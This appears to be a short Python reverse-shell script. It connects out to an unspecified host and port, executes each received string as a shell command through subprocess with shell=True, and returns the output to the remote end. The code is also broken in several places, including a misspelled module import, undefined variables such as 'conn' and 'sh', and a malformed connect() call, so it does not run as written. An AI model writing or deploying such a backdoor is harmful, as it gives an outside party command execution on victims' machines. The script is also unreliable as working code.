#!/usr/bin/python

import socket, subproces as sp, sys

host=""
port=""

connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(host, port)


while 1:
	command = str(conn.recv(1024))

	if command != "exit":
		s = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
		
		out, err = sh.communicate()

		result = str(out) + str(err)

		lenght = str(len(result)).zfill(16)

	connect.send(lenght + result)
